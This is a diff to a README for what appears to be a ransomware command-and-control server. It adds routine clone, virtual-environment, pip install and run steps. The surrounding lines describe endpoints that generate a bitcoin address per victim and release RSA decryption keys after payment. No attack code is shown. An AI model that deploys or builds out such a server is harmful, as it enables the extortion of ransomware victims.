@@ -1,3 +1,37 @@
+## Installation
+The project can be run in Python 3.6 and above.
+
+Clone the repository
+```
+git clone https://github.com/Suryak-5328/KMike.git
+```
+
+Navigate to the c_and_c_server folder in the cloned repository
+```
+cd KMike/c_and_c_server
+```
+
+[Create a python virtual environment](https://docs.python.org/3/tutorial/venv.html)
+```
+python -m venv venv
+```
+
+Activate the virtual environment
+```
+source venv/bin/activate
+```
+
+Install the required packages 
+```
+pip install -r requirements.txt
+```
+
+## Usage
+Run the program
+```
+python server.py
+```
+
 ## **Server Layout and Functionality**
     /initialise => This endpoint generates bitcoin address for each victim
     /decrypt => The ransomware will hit this endpoint after making payment to verify the payment and decrypt the RSA keys
